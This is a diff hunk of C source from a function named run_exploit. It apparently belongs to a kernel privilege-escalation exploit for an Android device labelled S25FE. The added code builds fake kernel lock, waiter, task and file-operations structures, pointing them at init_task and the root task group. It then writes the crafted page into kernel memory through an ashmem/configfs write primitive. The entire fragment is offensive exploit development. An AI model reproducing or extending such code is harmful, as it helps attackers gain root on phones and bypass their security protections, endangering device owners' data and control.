@@ -450,9 +450,54 @@ int run_exploit(int argc, char **argv) {
   pr_info("app fops stage: skipping P0 pipe preparation\n");
 #endif
   /* S25FE: reuse slide leak page; skip prepare_good_kernel_page() */
+  /* S25FE: reuse slide page but initialize fake structures via configfs */
   if (page_base) {
-    fake_lock = page_base + FAKE_LOCK_OFF;
-    fake_fops = page_base + FOPS_OFF;
+    fake_lock = page_base + LOCK_OFF;
+    fake_w0 = page_base + W0_OFF;
+    fake_task = page_base + FAKE_TASK_OFF;
+    fake_fops = page_base + FOPS_TABLE_OFF;
+    fake_parent = fake_fops;
+    fake_right = canon_addr(ASHMEM_MISC_FOPS);
+    fake_left = 0;
+    binwrite_target = page_base + SCRATCH_OFF;
+
+    int fd = open_ashmem_device();
+    if (fd >= 0) {
+      unsigned char p[ORDER3_SIZE];
+      memset(p, 0, sizeof(p));
+
+      /* Lock structure */
+      put32(p, LOCK_OFF + 0x00, 0);
+      put64(p, LOCK_OFF + 0x08, fake_w0);
+      put64(p, LOCK_OFF + 0x10, fake_w0);
+      put64(p, LOCK_OFF + 0x18, fake_task | 1);
+
+      /* Waiter */
+      put_fake_waiter(p, W0_OFF, 1, 0, 0, fake_parent, fake_right, fake_left,
+                      text_addr(INIT_TASK), fake_lock, FAKE_WAITER_PRIO);
+
+      /* Task */
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, text_addr(ROOT_TASK_GROUP));
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, text_addr(INIT_TASK));
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+
+      /* Fops table */
+      put_fake_fops_table(p, FOPS_TABLE_OFF);
+
+      /* Write entire page via configfs */
+      if (kernel_write_data(fd, page_base, p, ORDER3_SIZE) == (ssize_t)ORDER3_SIZE) {
+        pr_success("S25FE: initialized fake page via configfs\n");
+      } else {
+        pr_error("S25FE: configfs page init failed errno=%d\n", errno);
+      }
+      close(fd);
+    }
     pr_info("S25FE: reusing slide page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
   } else {
